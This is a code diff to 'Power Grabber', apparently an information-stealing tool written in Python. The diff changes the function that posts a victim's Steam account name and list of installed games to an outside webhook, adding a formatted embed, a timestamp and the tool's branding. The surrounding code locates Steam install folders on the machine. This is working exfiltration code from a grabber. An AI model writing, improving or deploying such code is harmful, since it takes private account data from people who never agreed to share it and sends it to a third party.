@@ -1,7 +1,7 @@
 import os
 import re
 import requests
-
+import datetime
 STEAM_DEFAULT_PATHS = [
     "C:\\Program Files (x86)\\Steam",
     "C:\\Program Files\\Steam",
@@ -61,19 +61,44 @@ def get_installed_steam_games(steam_install_path):
                         installed_games.append(game_name)
     return installed_games
 def send_webhook(account_name, games):
+    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
     embed = {
         "embeds": [
             {
-                "title": "Steam Account Info",
-                "description": f"# Steam Account Name:\n{account_name}\n\n# Installed Games:\n" + "\n".join(games),
+                "title": f"🎮 Steam Account Info for **{account_name}**",
+                "description": (
+                    "Here's the **Steam Account Information** and a list of **installed games** for this user. "
+                    "Explore your gaming universe with us!"
+                ),
                 "color": 0x8b0000,
+                "thumbnail": {
+                    "url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
+                },
+                "fields": [
+                    {
+                        "name": "👤 **Steam Account Name**",
+                        "value": f"**{account_name}**",
+                        "inline": True
+                    },
+                    {
+                        "name": "🎮 **Number of Games**",
+                        "value": f"{len(games)} games installed",
+                        "inline": True
+                    },
+                    {
+                        "name": "🕹️ **Installed Games**",
+                        "value": "\n".join(games) if games else "No games installed.",
+                        "inline": False
+                    }
+                ],
                 "footer": {
-                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe"
-                }
+                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe",
+                    "icon_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
+                },
+                "timestamp": timestamp
             }
         ]
     }
-    
     try:
         response = requests.post(webhook_url, json=embed)
         if response.status_code == 204:
